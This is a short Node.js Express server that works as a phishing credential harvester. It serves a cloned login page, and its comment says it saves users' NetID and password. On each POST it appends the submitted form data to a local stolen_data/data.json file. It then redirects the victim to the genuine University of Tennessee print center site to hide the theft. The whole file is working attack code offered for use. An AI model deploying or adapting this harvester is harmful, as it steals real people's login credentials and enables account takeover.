const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const app = express();

app.listen(3000, () => {
  console.log("Application started and Listening on port 3000");
});

app.use(express.static(__dirname));
app.use(bodyParser.urlencoded({ extended: true }));

/* Render the HTML */
app.get("/", (req, res) => {
  res.sendFile(__dirname + "/index.html");
});

/* During a post (trying to log in), save the user's NetID and Password into a JSON file and redirect to the legit site */
app.post("/", function (req, res) {
  var body = {
    user_info: req.body,
  };
  let filePath = __dirname + "/stolen_data/data.json";

  fs.appendFile(filePath, JSON.stringify(body), function (err) {
    if (err) {
      throw err;
    }
    res.status(200);
    res.redirect(302, "https://myprint.utk.edu/myprintcenter/");
  });
});
